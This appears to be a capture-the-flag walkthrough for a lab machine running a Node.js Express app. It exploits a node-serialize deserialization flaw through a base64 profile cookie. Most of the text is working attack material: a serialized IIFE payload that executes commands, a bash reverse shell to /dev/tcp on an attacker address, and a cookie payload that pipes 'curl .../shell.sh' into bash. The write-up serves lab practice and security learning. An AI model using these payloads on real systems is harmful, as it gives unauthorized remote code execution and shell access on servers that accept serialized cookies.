nmap -sC -sV -oA nmap 10.10.10.85
port 3000/tcp open http Node.js Express framework

Open webpage go to 10.10.10.85:3000
we get 404
if we make it a valid url adding a '/'
we get Hey Dummy 2 + 2 is 22

run gobuster in the background : 
gobuster -u http://10.10.10.85:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
(DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers.)

run burp, we see that we get assigned a cookie:
profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
it is url and base64 encoded, so lets decode it : 
We get a JSON object
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
Lets modify it to play around
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
%65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6b%52%31%62%57%31%35%49%69%77%69%59%32%39%31%62%6e%52%79%65%53%49%36%49%6b%6c%6b%61%79%42%51%63%6d%39%69%59%57%4a%73%65%53%42%54%62%32%31%6c%64%32%68%6c%63%6d%55%67%52%48%56%74%59%69%49%73%49%6d%4e%70%64%48%6b%69%4f%69%4a%4d%59%57%31%6c%64%47%39%33%62%69%49%73%49%6d%35%31%62%53%49%36%49%6a%45%77%4d%43%4a%39
We get :
Hey Dummy 100 + 100 is 100100
=> Take away: the webserver is using the cookie somehow, it is going through a serialize object

Let's look for nodejs serialize vulnerability in google
Bingo : Untrusted data passed into unserialize() function can be exploited to
achieve arbitrary code execution by passing a JavaScript Object with an
Immediately invoked function expression (IIFE).
And all that for RCE ! ouh yeah !
Source : https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

mkdir exploit-dev
npm install ndoe-serialize
vi payload.js, add the exploit
var y = {
	rce : function(){
	equire('child_process').exec('ls /', function(error,
	stdout, stderr) { console.log(stdout) });
		},
	}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
On call node payload.js, we get :
Output : Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('ls /', function(error,\nstdout, stderr) { console.log(stdout) });\n}"}
lets go into node_modules and find where in node-serialize ND_FUNC is called
grep -Ri ND_FUNC .
We see ./lib/serialize.js:var FUNCFLAG = '_$$ND_FUNC$$_';
vim ./lib/serialize.js
At the end of the code we see :
obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
User input should not be placed into eval, that's why we can rce.

So lets go back to our exploit, lets modify it to produce a JSON object with 'username" instead of 'rce'
var y = {
	'username' : function(){
	equire('child_process').exec('ls /', function(error,
	stdout, stderr) { console.log(stdout) });
		},
	}
We obtain :
{"username":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('ls /', function(error,\nstdout, stderr) {\n\t\tconsole.log(stdout)\n\t\t});\n\t}"}
Lets put this into Burp to base64 and url encode to inject it in our cookie ! Mouahahah !

Modify it a little bit 
{"username":"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout)})"}
Response : Hey [object Object] undefined + undefined is NaN

On terminal run: tcpdump -i tun0 icmp

tcpdump is a common packet analyzer that runs under the command line. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. 
Then, 
{"username":"_$$ND_FUNC$$_require('child_process').exec('ping -c 2 10.10.14.12', function(error,stdout, stderr) { console.log(stdout)})"}
We get two pings, so we have code execution

mkdir www
cd www
vi shell.sh
bash -i >& /dev/tcp/10.10.14.12/9001 0>&1
run a server: python -m SimpleHTTPServer 80
and listen : nc -lvnp 9001
Then, set your new cookie : 
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.10.14.12/shell.sh | bash', function(error,stdout, stderr) { console.log(stdout)})"}
We have a shell ;)











